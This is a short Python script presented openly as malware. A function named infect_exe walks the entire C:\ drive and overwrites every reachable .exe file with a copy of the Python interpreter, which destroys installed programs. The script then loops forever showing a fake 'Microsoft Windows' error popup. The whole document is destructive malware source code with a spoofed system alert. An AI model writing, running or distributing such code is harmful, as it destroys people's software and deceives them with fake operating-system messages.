import os
import time
import sys
import shutil
import pyautogui as autogui

def infect_exe(file_path, executable_path):
    try:
        shutil.copy(executable_path, file_path)
    except (PermissionError, FileNotFoundError, IOError) as e:
        print(f"Skipping file {file_path}: {e}")

def main():
    executable_path = sys.executable
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            if file.endswith('.exe'):
                file_path = os.path.join(root, file)
                infect_exe(file_path, executable_path)

if __name__ == '__main__':
    main()
while True:
    time.sleep(5)
    autogui.alert(text="App has quit unexpectly", title="Microsoft Windows", button="Close app")
